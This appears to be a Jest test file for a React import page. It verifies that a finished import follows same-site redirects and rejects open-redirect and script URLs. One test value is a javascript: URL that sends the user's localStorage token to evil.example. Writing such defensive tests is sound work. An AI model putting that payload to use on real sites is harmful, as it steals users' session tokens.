import { act, render } from '@testing-library/react';
import { MemoryRouter, Route, Routes } from 'react-router-dom';

import ImportPage from '../ImportPage';

const mockImportProps: { current?: { onSuccessfulImport?: () => void } } = {};
const startPage = 'http://localhost/import';
let href = startPage;

jest.mock('react-i18next', () => ({ useTranslation: () => ({ t: (key: string) => key }) }));
jest.mock('@/components/app/hooks/useWorkspaceCreationCapability', () => ({
  useWorkspaceCreationCapability: () => ({ status: 'ready', canCreate: true, checking: false, refresh: jest.fn() }),
}));
jest.mock('@/components/_shared/more-actions/importer/Import', () => ({
  __esModule: true,
  default: (props: { onSuccessfulImport?: () => void }) => {
    mockImportProps.current = props;
    return null;
  },
}));

// jsdom cannot navigate; record where the page sends the browser instead.
Object.defineProperty(window, 'location', {
  writable: true,
  value: {
    get href() {
      return href;
    },
    set href(value: string) {
      href = value;
    },
    origin: 'http://localhost',
  },
});

function finishImport(redirectTo: string) {
  render(
    <MemoryRouter
      initialEntries={[`/import?action=import&source=notion&redirectToImport=${encodeURIComponent(redirectTo)}`]}
      future={{ v7_relativeSplatPath: true, v7_startTransition: true }}
    >
      <Routes>
        <Route path='/import' element={<ImportPage />} />
      </Routes>
    </MemoryRouter>
  );
  act(() => mockImportProps.current?.onSuccessfulImport?.());
}

beforeEach(() => {
  href = startPage;
  mockImportProps.current = undefined;
});

test.each(['/app', 'http://localhost/app/workspace'])('a finished import follows a same-site redirect (%s)', (target) => {
  finishImport(target);
  expect(href).toBe(target);
});

test.each([
  'javascript:fetch("//evil.example/?"+localStorage.getItem("token"))',
  'https://evil.example/steal',
  '//evil.example/steal',
  '/\\evil.example/steal',
])('a finished import ignores a redirect that could run a script or leave the site (%s)', (target) => {
  finishImport(target);
  expect(href).toBe(startPage);
});
